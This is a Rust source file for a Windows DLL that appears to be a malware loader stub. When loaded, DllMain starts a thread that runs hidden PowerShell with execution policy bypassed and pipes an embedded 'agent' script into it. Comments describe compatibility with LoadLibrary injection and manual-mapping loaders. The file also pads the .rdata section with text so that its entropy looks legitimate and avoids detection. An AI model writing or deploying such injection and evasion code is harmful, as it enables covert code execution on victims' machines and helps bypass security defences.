// DLL entry: DllMain spawns a background thread that runs the agent.
// Compatible with LoadLibrary injection and manual mapping loaders.
// HINSTANCE is stored at attach time so launch() can resolve the DLL's own path for _STUB_PATH.
use std::ffi::c_void;
use std::sync::atomic::{AtomicUsize, Ordering};

// 128 KB of natural-language text placed directly in .rdata.
// Target: .rdata section entropy ≤ 5.5 b/B (legitimate range 4.0–5.5).
// Must use [u8; N] — &[u8] only moves the fat-pointer, not the payload bytes.
#[link_section = ".rdata"]
#[used]
static _PAD: [u8; 131072] = *include_bytes!(concat!(env!("OUT_DIR"), "/e.bin"));

static HINSTANCE: AtomicUsize = AtomicUsize::new(0);

extern "system" {
    fn GetModuleFileNameW(hModule: usize, lpFilename: *mut u16, nSize: u32) -> u32;
}

#[no_mangle]
pub unsafe extern "system" fn DllMain(
    hinst: *mut c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if fdw_reason == DLL_PROCESS_ATTACH {
        HINSTANCE.store(hinst as usize, Ordering::Relaxed);
        std::thread::spawn(launch);
    }
    1
}

fn dll_path() -> String {
    let h = HINSTANCE.load(Ordering::Relaxed);
    if h == 0 { return String::new(); }
    let mut buf = vec![0u16; 1024];
    let len = unsafe { GetModuleFileNameW(h, buf.as_mut_ptr(), buf.len() as u32) } as usize;
    if len == 0 { return String::new(); }
    String::from_utf16_lossy(&buf[..len])
}

fn launch() {
    use std::io::Write;
    use std::os::windows::process::CommandExt;
    use std::process::{Command, Stdio};

    let _ = std::hint::black_box(_PAD.as_ptr());
    const SCRIPT: &[u8] = include_bytes!(env!("STRATUM_AGENT_PATH"));
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let path = dll_path();

    if let Ok(mut child) = Command::new("powershell.exe")
        .args([
            "-NonInteractive",
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command", "-",
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(CREATE_NO_WINDOW)
        .env("_STUB_PATH", &path)
        .spawn()
    {
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(SCRIPT);
        }
        let _ = child.wait(); // thread stays alive while agent runs
    }
}
